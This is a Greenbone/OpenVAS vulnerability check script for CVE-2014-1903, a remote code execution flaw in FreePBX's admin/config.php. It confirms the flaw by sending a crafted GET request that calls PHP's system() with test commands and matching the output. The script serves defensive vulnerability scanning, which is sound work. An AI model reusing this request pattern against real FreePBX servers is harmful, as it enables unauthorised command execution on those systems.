CPE = "cpe:/a:freepbx:freepbx";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103920" );
	script_bugtraq_id( 65509 );
	script_cve_id( "CVE-2014-1903" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "FreePBX 'admin/config.php' Remote Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/65509" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-03-14 11:41:40 +0100 (Fri, 14 Mar 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_freepbx_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "freepbx/installed" );
	script_tag( name: "impact", value: "Successfully exploiting this issue will allow attackers to execute
  arbitrary code in the context of the affected application. Failed exploit attempts may result in a
  denial-of-service condition." );
	script_tag( name: "vuldetect", value: "Tries to execute a command with a special crafted HTTP GET request." );
	script_tag( name: "insight", value: "admin/libraries/view.functions.php does not restrict the set of
  functions accessible to the API handler, which allows remote attackers to execute arbitrary PHP code
  via the function and args parameters to admin/config.php." );
	script_tag( name: "summary", value: "FreePBX is prone to a remote code execution vulnerability." );
	script_tag( name: "affected", value: "FreePBX versions 2.9, 2.10, 2.11, and 12 are vulnerable." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
cmds = exploit_commands( "linux" );
vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
for pattern in keys( cmds ) {
	cmd = cmds[pattern];
	url = dir + "/admin/config.php?display=" + vtstring + "&handler=api&file=" + vtstring + "&module=" + vtstring + "&function=system&args=" + cmd;
	if(buf = http_vuln_check( port: port, url: url, pattern: pattern )){
		report = "By requesting the URL \"" + url + "\"\n the scanner received the following response:\n\n" + buf;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

